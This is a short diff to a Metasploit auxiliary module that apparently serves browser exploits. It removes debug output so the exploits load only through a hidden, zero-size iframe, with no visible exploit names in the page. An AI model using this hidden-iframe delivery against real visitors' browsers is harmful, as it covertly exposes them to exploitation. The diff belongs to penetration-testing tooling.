@@ -65,7 +65,7 @@ class Metasploit3 < Msf::Auxiliary
 		# For testing, set the exploit uri to the name of the exploit so it's
 		# easy to tell what is happening from the browser.
 		# XXX: Comment this out for release
-		@exploits[name].datastore['URIPATH'] = name  
+		#@exploits[name].datastore['URIPATH'] = name  
 
 		@exploits[name].datastore['LPORT']   = @lport
 		@exploits[name].datastore['LHOST']   = @lhost
@@ -650,7 +650,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	def build_iframe(resource)
 		ret = ''
-		ret << "<p>#{resource}</p>"
+		#ret << "<p>#{resource}</p>"
 		ret << "<iframe src=\"#{resource}\" style=\"visibility:hidden\" height=\"0\" width=\"0\" border=\"0\"></iframe>"
 		return ret
 	end
